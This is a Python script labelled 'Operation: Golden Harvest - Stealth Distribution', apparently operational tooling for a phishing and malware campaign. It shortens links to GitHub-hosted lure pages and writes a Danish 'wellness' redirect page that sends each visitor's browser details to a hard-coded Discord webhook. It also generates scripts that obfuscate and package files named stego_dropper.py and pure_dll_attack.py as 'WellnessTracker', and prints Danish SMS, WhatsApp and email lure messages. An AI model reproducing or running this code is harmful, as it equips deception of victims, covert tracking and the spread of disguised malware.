#!/usr/bin/env python3
"""
URL Shortener Generator & PyArmor Obfuscation
Operation: Golden Harvest - Stealth Distribution
"""

import requests
import json
import random
import string
from urllib.parse import urlencode

class URLShortenerGenerator:
    def __init__(self):
        self.webhook_url = "https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN"
        self.target_urls = [
            "https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/legitimate_landing.html",
            "https://cdn.jsdelivr.net/gh/Jeki1234121/hollistisk-v2/legitimate_landing.html",
            "https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/index_dll_version.html",
            "https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/domain_rotator.html"
        ]
        
    def create_tinyurl_batch(self):
        """Generate TinyURL links via API"""
        print("🔗 TINYURL GENERATOR")
        print("=" * 50)
        
        shortened_urls = []
        for url in self.target_urls:
            try:
                response = requests.get(f"https://tinyurl.com/api-create.php?url={url}")
                if response.status_code == 200:
                    short_url = response.text.strip()
                    print(f"✅ {url} -> {short_url}")
                    shortened_urls.append(short_url)
                else:
                    print(f"❌ Failed to shorten: {url}")
            except Exception as e:
                print(f"❌ Error with {url}: {e}")
                
        return shortened_urls

    def create_vgd_shortener(self):
        """Generate v.gd shortened URLs"""
        print("\n🔗 V.GD SHORTENER")
        print("=" * 50)
        
        shortened_urls = []
        for url in self.target_urls:
            try:
                data = {'format': 'simple', 'url': url}
                response = requests.post('https://v.gd/create.php', data=data)
                if response.status_code == 200 and 'v.gd' in response.text:
                    short_url = response.text.strip()
                    print(f"✅ {url} -> {short_url}")
                    shortened_urls.append(short_url)
                else:
                    print(f"❌ Failed: {url}")
            except Exception as e:
                print(f"❌ Error: {e}")
                
        return shortened_urls

    def generate_custom_shortener_html(self):
        """Create our own URL shortener page"""
        shortener_html = f'''<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wellness Link - Hurtig Adgang</title>
    <style>
        body {{
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0; padding: 0; min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
        }}
        .container {{
            background: white; border-radius: 15px;
            padding: 40px; text-align: center; max-width: 400px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }}
        .loading {{ 
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 20px auto;
        }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="container">
        <h2>🧘‍♀️ Wellness Community</h2>
        <p>Omdirigerer til den sikreste wellness side...</p>
        <div class="loading"></div>
        <p><small>Forbinder til premium indhold</small></p>
    </div>
    
    <script>
        // Random delay for human-like behavior
        const delay = Math.random() * 2000 + 1000;
        
        // Track access
        fetch('{self.webhook_url}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                content: `🎯 **Shortener Access**\\n**UserAgent:** ${{navigator.userAgent}}\\n**Referrer:** ${{document.referrer}}\\n**Time:** ${{new Date().toISOString()}}`
            }})
        }}).catch(() => {{}});
        
        // Redirect after delay
        setTimeout(() => {{
            const urls = [
                'https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/legitimate_landing.html',
                'https://cdn.jsdelivr.net/gh/Jeki1234121/hollistisk-v2/legitimate_landing.html',
                'https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/domain_rotator.html'
            ];
            
            const randomUrl = urls[Math.floor(Math.random() * urls.length)];
            window.location.href = randomUrl;
        }}, delay);
    </script>
</body>
</html>'''

        with open("w.html", "w", encoding='utf-8') as f:
            f.write(shortener_html)
            
        print("\n🎯 CUSTOM SHORTENER CREATED")
        print("=" * 50)
        print("✅ w.html created - Upload to GitHub!")
        print("URL: https://raw.githubusercontent.com/Jeki1234121/hollistisk-v2/main/w.html")

    def create_pyarmor_obfuscation_script(self):
        """Generate PyArmor obfuscation commands"""
        
        obfuscation_script = '''#!/bin/bash
# PyArmor Obfuscation Script
# Operation: Golden Harvest - Python Code Protection

echo "🛡️  PYARMOR OBFUSCATION STARTING..."
echo "================================================"

# Install PyArmor if not installed
pip install pyarmor

# Create obfuscated versions of our Python scripts
echo "🔒 Obfuscating Python files..."

# Obfuscate main scripts
pyarmor obfuscate --advanced 2 --mix-str --assert-call stego_dropper.py
pyarmor obfuscate --advanced 2 --mix-str --assert-call pure_dll_attack.py
pyarmor obfuscate --advanced 2 --mix-str --assert-call intelligent_ai_robot.py
pyarmor obfuscate --advanced 2 --mix-str --assert-call smart_robot_framework.py

# Create distributable package
pyarmor pack --clean --name "WellnessTracker" stego_dropper.py

echo "✅ Obfuscation complete!"
echo "Files created in ./dist/ directory"

# Move obfuscated files
mkdir -p obfuscated
mv dist/* obfuscated/
mv *.pyc obfuscated/ 2>/dev/null || true

echo "🎯 OBFUSCATED FILES READY FOR DISTRIBUTION"
'''

        with open("obfuscate.sh", "w", encoding='utf-8') as f:
            f.write(obfuscation_script)
            
        # Windows batch version
        batch_script = '''@echo off
title PyArmor Obfuscation - Operation Golden Harvest
echo 🛡️  PYARMOR OBFUSCATION STARTING...
echo ================================================

REM Install PyArmor if not installed
pip install pyarmor

REM Create obfuscated versions
echo 🔒 Obfuscating Python files...

pyarmor obfuscate --advanced 2 --mix-str --assert-call stego_dropper.py
pyarmor obfuscate --advanced 2 --mix-str --assert-call pure_dll_attack.py
pyarmor obfuscate --advanced 2 --mix-str --assert-call intelligent_ai_robot.py
pyarmor obfuscate --advanced 2 --mix-str --assert-call smart_robot_framework.py

REM Create distributable package
pyarmor pack --clean --name "WellnessTracker" stego_dropper.py

echo ✅ Obfuscation complete!
echo Files created in ./dist/ directory

REM Move obfuscated files
mkdir obfuscated 2>nul
move dist\\* obfuscated\\
move *.pyc obfuscated\\ 2>nul

echo 🎯 OBFUSCATED FILES READY FOR DISTRIBUTION
pause
'''

        with open("obfuscate.bat", "w", encoding='utf-8') as f:
            f.write(batch_script)
            
        print("\n🛡️  PYARMOR OBFUSCATION SETUP")
        print("=" * 50)
        print("✅ obfuscate.bat created (Windows)")
        print("✅ obfuscate.sh created (Linux/Mac)")
        print("\nFeatures:")
        print("• Advanced obfuscation level 2")
        print("• String mixing")
        print("• Assert call protection")
        print("• Packed executable creation")

    def generate_social_engineering_messages(self, short_urls):
        """Generate social engineering messages with shortened URLs"""
        
        messages = {
            "SMS": [
                f"🧘‍♀️ Hej! Fandt denne fede wellness app: {short_urls[0] if short_urls else '[URL]'} - super god til meditation!",
                f"Tjek denne wellness tracker jeg bruger: {short_urls[0] if short_urls else '[URL]'} 🌿 Anbefaler den varmt!",
                f"Wellness community med 1200+ medlemmer: {short_urls[0] if short_urls else '[URL]'} - join os! 💚"
            ],
            "WhatsApp": [
                f"Så fed wellness app! 🧘‍♀️ Prøv den her: {short_urls[0] if short_urls else '[URL]'} \nHar hjulpet mig så meget med meditation 🌿",
                f"Hej! Du skal prøve denne wellness tracker: {short_urls[0] if short_urls else '[URL]'} \nSuper god til at holde styr på sine vaner! 💪",
                f"Fandt danmarks bedste wellness community: {short_urls[0] if short_urls else '[URL]'} \nOver 1000 medlemmer! 🎯"
            ],
            "Email": [
                f"Kære [NAVN],\n\nJeg vil gerne anbefale denne fantastiske wellness tracker jeg er begyndt at bruge: {short_urls[0] if short_urls else '[URL]'}\n\nDen har virkelig hjulpet mig med at holde styr på mine wellness-mål.\n\nBedste hilsner,\n[DIT_NAVN]",
                f"Hej [NAVN]!\n\nJeg stødte på denne wellness community: {short_urls[0] if short_urls else '[URL]'} og tænkte du måske ville være interesseret?\n\nDe har nogle rigtig gode tips til meditation og holistisk sundhed.\n\nVenlig hilsen,\n[DIT_NAVN]"
            ]
        }
        
        print("\n📱 SOCIAL ENGINEERING MESSAGES")
        print("=" * 50)
        
        for platform, msgs in messages.items():
            print(f"\n{platform} Messages:")
            for i, msg in enumerate(msgs, 1):
                print(f"{i}. {msg}\n")

if __name__ == "__main__":
    print("🎯 GOLDEN HARVEST - URL Shortener & Obfuscation")
    print("=" * 60)
    
    generator = URLShortenerGenerator()
    
    # Generate URL shorteners
    tinyurl_links = generator.create_tinyurl_batch()
    vgd_links = generator.create_vgd_shortener()
    
    # Create custom shortener
    generator.generate_custom_shortener_html()
    
    # Setup PyArmor obfuscation
    generator.create_pyarmor_obfuscation_script()
    
    # Generate social engineering messages
    all_short_urls = tinyurl_links + vgd_links
    generator.generate_social_engineering_messages(all_short_urls)
    
    print(f"\n🎯 OPERATION SUMMARY:")
    print(f"• TinyURL links generated: {len(tinyurl_links)}")
    print(f"• V.gd links generated: {len(vgd_links)}")
    print(f"• Custom shortener: w.html")
    print(f"• PyArmor obfuscation: obfuscate.bat")
    print(f"• Social engineering templates ready")
    
    print(f"\n🚀 NEXT STEPS:")
    print(f"1. Run: obfuscate.bat")
    print(f"2. Upload w.html to GitHub")
    print(f"3. Use shortened URLs for distribution")
    print(f"4. Deploy obfuscated Python files")